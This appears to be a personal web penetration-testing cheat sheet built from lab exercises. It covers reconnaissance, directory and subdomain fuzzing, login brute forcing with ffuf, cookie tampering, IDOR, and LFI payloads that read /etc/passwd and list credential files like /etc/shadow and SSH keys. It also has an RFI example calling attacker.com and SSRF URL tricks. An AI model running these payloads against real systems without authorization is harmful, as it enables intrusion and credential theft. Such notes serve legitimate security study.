`# Web Hacking Playbook


## RECON
### Domain/DNS Enumeration
- [ ] DNSRecon  ``` dnsrecon -t brt -d website.com```
- [ ] [Sublist3r](https://github.com/aboul3la/Sublist3r) ```sublist3r -d <domain>```
- [ ] gobuster
      - ```gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<domain> --append-domain```
- [ ] ffuf
   - ```ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.<DOMAIN>" -u http://<DOMAIN>```

### Certificate Recon
- [ ] [cert.sh](https://crt.sh)```%.<domain>```
   * Can be used to gleam a lot of info and endpoints to recon or test

### Builtwith.com
   - [Builtwith](https://builtwith.com)
   - Additional information for fingerprinting

### Credential Stuffing / Data leaks
   - [havibeenpwnd](https://haveibeenpwned.com)
   - [weleakinfo](https://weleakinfo.io)
      - paid, like $2 for 24 hours
### Hunter.io
   - [hunter.io](https://www.hunter.io)
   - Great for searching for contact info. Can use this info for phishing, logins, etc.
   - Can also sometimes see the email alias patterns such as {f}{lastname}@domain.com

### Application Walking
- [ ] Inspect page source (view-source:https://www.google.com/)
- [ ] Inspect debugger for errors to exploit
    - [ ] Try inserting breakpoints to pause processing (click line number to turn blue)
- [ ] Check network tab on debugger panel, check resources for exploits and information.

### BurpSuite Proxy Discovery
   1. Start Burp, set proxy to 127.0.0.1 or use foxy proxy
   2. Navigate to site and watch Target tab for discovery
      - Optionally add the site to your scope to refine information and make search easier
      - You can then apply the filter of only showing in-scope items
      - Alternately you can also use advanced scope settings:
         - A great regex filter for host or IP range: ```.*\.test\.com$ (replace test w/ domain)
      - You can also exclude stuff from scope here
         - You can right-click and remove from scope
   3. You can also Crawl it with a right-click scan/crawl via Burp's Spider
   4. Check out the robots.txt
### Content Discovery
- [ ] Check robots.txt for info and endpoints
- [ ] Check favicon. The icon can be used to discover framework stacks with [OWASP Favicon List](https://wiki.owasp.org/index.php/OWASP_favicon_database) using the md5 of the favicon
```
curl https://<SERVER_IP:PORT>/favicon.ico | md5sum
```
- [ ] Check the sitemap.xml for info
- [ ] Check HTTP Headers
```
curl http://<SERVER_IP:PORT> -v
```

### OSINT
----
#### Google Dorking
| Filter | Example | Description |
| --- | --- | --- |
| site | ```site:website.com``` | returns results only from specified site |
| inurl | ```inurl:admin``` | returns results with specified word in URL |
| filetype | ```filetype:pdf``` | returns results that are a particular extension
| intitle | ```intitle:admin``` | returns results that contain the specified word in the title |

#### Wappalyzer
[Wappalyzer](https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.

#### Wayback Machine
[Wayback Machine](https://archive.org/web/) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.

#### GitHub
[GitHub](https://github.com) You can use GitHub's search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn't yet found.

#### S3 Buckets (Cloud storage discovery)
[Amazon S3](http://tryhackme-assets.s3.amazonaws.com/) sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.

### Security Headers
- [ ] [Security Headers](https://securityheaders.com) to test/scan headers

### Content Discovery
----
#### Ffuf
**Directory Fuzzing**

``` ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP:PORT>/FUZZ```

**Extension Fuzzing**

* Identify filetypes / server type (like php etc) 

```ffuf -s -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ  -u http://<SERVER_IP:PORT>/forum/indexFUZZ```

* Once you identify server type, then fuzz the actual filenames

```ffuf -s -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://<SERVER_IP:PORT>/forum/FUZZ<FILE EXTENSION>```

**Recursive Fuzzing**

```ffuf -s -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://<SERVER_IP:PORT>/FUZZ -recursion -recursion-depth 1 -e <FILE_EXTENSION> -v```

**GET Request Fuzzing**

```ffuf -w /home/kali/lists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<SERVER_IP:PORT>/admin/admin.php?FUZZ=key -fs 798```
* The ```-fs``` filter is added to filter unwanted results. The ```798``` came from seeing the response sizes w/o the filter.

**Wordlists And Value Fuzzing**

* Create a list of numeric IDs for use in fuzzing:
```for i in $(seq 1 1000); do echo $i >> ids.txt; done```

#### Dirb
- [ ] Directory traversal ```dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt```

#### Gobuster
- [ ] Directory traversal ```gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt```

#### Metasploit

- [ ] Directory Traversal
      1. ```sudo msfdb init && msfconsole```
      2. ```use auxillary/scanner/http/dir_scanner```
      3. ```set dictionary /usr/share/wordlists/dirb/common.txt```
      4. ```set rhosts <ip address>```
      5. ```set path /dvwa```
      6. ```exploit``

## Username searching using brute force

#### Ffuf

* **Auth with ffuf, attempting to find usernames**
   * ```ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://<URL>/<signup page> -mr "username already exists"```
   * -X = method
   * -d = data payload
   * -H = header
   * -mr = the error to locate a good username

* **Brute forcing a found username with ffuf**
```ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://<URL>/customers/login -fc 200```
   * -W1 and W2 are wordlists to get un and pw into the data payload

### Cookie Tampering

#### Paintext cookies
* **Testing a cookie**
   * Example: ```curl -H "Cookie: logged_in=true; admin=true" http://10.10.8.188/cookie-test```

* **Identifying Hashed Cookies**
   Sometimes cookies can look hased:
   | Hash Method | Example |
   | ----------- | ------- |
   | md5 | c4ca4238a0b923820dcc509a6f75849b |
   | sha-256 | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b |
   | sha-512 | 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a |
   | sha1 | 356a192b7913b04c54574d18c28d46e6395428ab |

   You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as [Crack Station](https://crackstation.net/) keep databases of billions of hashes and their original strings.

   [CyberChef](https://gchq.github.io/CyberChef/) is a really good option for dealing with hashes and base64

### IDOR (Insecure Direct Object Reference)
This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.

* **URL ID or Param modification**
   * If you find IDs or numbers, iterate the paramaters or URL and see if you can see information you shoudln't
   * Watch for base64 encoded information, you may be able to decode and modify it

* **Hashed IDs and IDORs**
   * Watch for hashed informatoin. Many times md5 is in use.

* **Unpredictible IDs**
   * If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability.

### File Inclusion

In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. 

   **Great files to look for file inclusion**
   | Location | Description |
   | -------- | ----------- |
   | /etc/issue | contains a message or system identification to be printed before the login prompt |
   | /etc/profile | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
   | /proc/version | specifies the version of the Linux kernel |
   | /etc/passwd | has all registered user that has access to a system |
   | /etc/shadow | contains information about the system's users' passwords |
   | /root/.bash_history | contains the history commands for root user |
   | /var/log/dmessage | contains global system messages, including the messages that are logged during system startup |
   | /var/mail/root | all emails for root user |
   | /root/.ssh/id_rsa | Private SSH keys for a root or any known valid user on the server
/var/log/apache2/access.log | the accessed requests for Apache  webserver |
   | C:\boot.ini | contains the boot options for computers with BIOS firmware |

* **LFI - Local File Inclusion**
   * PHP functions like *include*, *require*, *include_once*, and *require_once*, are a great place to start
   * Beyond using relative path testing such as ```../../../<FILE>``` test to see if the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is ```%00```. Example:
   By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like appending ```?lang=/etc/passwd%00```:

      ```http://webapp.thm/index.php?lang=../../../../etc/passwd%00```

      NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

   * bypassing php filter for LFI
      * You may be able to bypass by adding extra chars:
      ```....//....//....//....//....//etc/passwd```

* **RFI - Remote File Inclusion**
   * First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.com/index.php?lang=http://attacker.com/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker.

## SSRF And Blind SSRF

#### Endpoint change
   * Try a different endpoint. For example if one endpoint is ```http://store.site/shop?url=http://api.store.site/api/stock/item?id=123``` attempt to SSRF by trying ```http://store.site/shop?url=http://api.store.site/api/user```

   * Try directory traversal. For example if one endpoint is ```http://store.site/shop?url=/item?id=123``` attempt to SSRF by trying ```http://store.site/shop?url=/../user```

   * Try subdomain manipulation. The payload can be modified to end in &x= being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string. Example, if the endpoint is ```http://store.site/stock?server=api&id=123``` attempt the manipulatoin by using ```http://store.site/stock?server=api.server.store/api/user&x=&id=123```
